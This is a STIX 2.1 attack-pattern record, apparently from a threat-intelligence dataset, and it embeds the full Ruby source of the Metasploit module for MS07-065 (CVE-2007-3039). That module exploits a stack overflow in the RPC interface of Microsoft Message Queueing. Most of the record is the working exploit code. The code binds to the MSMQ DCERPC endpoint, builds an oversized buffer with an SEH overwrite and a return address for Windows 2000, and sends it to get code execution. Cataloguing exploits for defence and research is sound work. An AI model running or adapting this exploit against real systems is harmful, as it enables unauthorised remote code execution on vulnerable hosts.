{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d06a1e13-9810-4067-966b-080152ba3cd9",
    "created": "2024-08-14T16:39:40.585396Z",
    "modified": "2024-08-14T16:39:40.5854Z",
    "name": "MS07-065 Microsoft Message Queueing Service DNS Name Path Overflow",
    "description": " This module exploits a stack buffer overflow in the RPC interface to the Microsoft Message Queueing service. This exploit requires the target system to have been configured with a DNS name and for that name to be supplied in the 'DNAME' option. This name does not need to be served by a valid DNS server, only configured on the target machine.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/dcerpc/ms07_065_msmq.rb",
            "external_id": "ms07_065_msmq.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3039"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS07-065 Microsoft Message Queueing Service DNS Name Path Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the RPC interface\n      to the Microsoft Message Queueing service. This exploit requires\n      the target system to have been configured with a DNS name and\n      for that name to be supplied in the 'DNAME' option. This name does\n      not need to be served by a valid DNS server, only configured on\n      the target machine.\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-3039'],\n          [ 'OSVDB', '39123'],\n          [ 'MSB', 'MS07-065'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\xff\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 Server English',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x75022ac4 # ws2help - pop/pop/ret\n            },\n          ],\n        ],\n      'DisclosureDate' => '2007-12-11',\n      'DefaultTarget' => 0))\n\n    # Change the default port values to point at MSMQ\n    register_options(\n      [\n        Opt::RPORT(2103),\n        OptString.new('DNAME',  [ true,  \"The DNS hostname of the target\" ]),\n      ])\n  end\n\n  def autofilter\n    # Common vulnerability scanning tools report port 445/139\n    # due to how they test for the vulnerability. Remap this\n    # back to 2103 for automated exploitation\n\n    rport = datastore['RPORT'].to_i\n    if ( rport == 445 or rport == 139 )\n      datastore['RPORT'] = 2103\n    end\n\n    # The fqdn is required to exploit this bug\n    if (not datastore['DNAME'])\n      # XXX automatically determine the hostname\n      return false\n    end\n\n    true\n  end\n\n  def exploit\n\n    connect\n    print_status(\"Trying target #{target.name}...\")\n\n    handle = dcerpc_handle('fdb3a030-065f-11d1-bb9b-00a024ea5525', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    dname = datastore['DNAME']\n\n    boom = rand_text_alphanumeric(4096)\n\n    hname,domain = dname.split(\".\")\n\n    if(not domain)\n      print_status(\"The DNAME parameter specified is not valid.\")\n      print_status(\"This option must be the fully-qualified domain name of the target (as it has been configured).\")\n      return\n    end\n\n    off = 310 - (hname.length * 2)\n\n    seh = generate_seh_payload(target.ret)\n    boom[off, seh.length] = seh\n\n    buff  = Rex::Text.to_unicode(\"#{dname}\\\\\")\n    buff << boom\n    buff << \"\\x00\\x00\"\n\n    # Data alignment\n    while(buff.length % 4 != 0)\n      buff << \"\\x00\"\n    end\n\n    stubdata =\n      NDR.long(1) +                                           # [in] long arg_1,\n      NDR.UnicodeConformantVaryingStringPreBuilt(buff) +      # [in][string] wchar_t * arg_2,\n      NDR.long(0) * 5                                         # ... fields we can ignore\n\n    print_status('Sending exploit...')\n\n    begin\n      response = dcerpc.call(6, stubdata)\n\n      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)\n        case dcerpc.last_response.stub_data\n        when \"\\x14\\x00\\x0e\\xc0\"\n          print_error(\"Error: The wrong value has been supplied for the DNAME parameter\")\n          print_error(\"This value must be the fully-qualified domain name of the target\")\n          print_error(\"Many systems have no FQDN configured and cannot be exploited\")\n        else\n          print_status(\"An unknown response was received from the server:\")\n          print_status(\">> \" + dcerpc.last_response.stub_data.unpack(\"H*\")[0])\n        end\n      end\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      print_status(\"No response from the DCERPC service (this is usually a good thing).\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-12-11",
    "x_mitre_platforms": [
        "win'"
    ]
}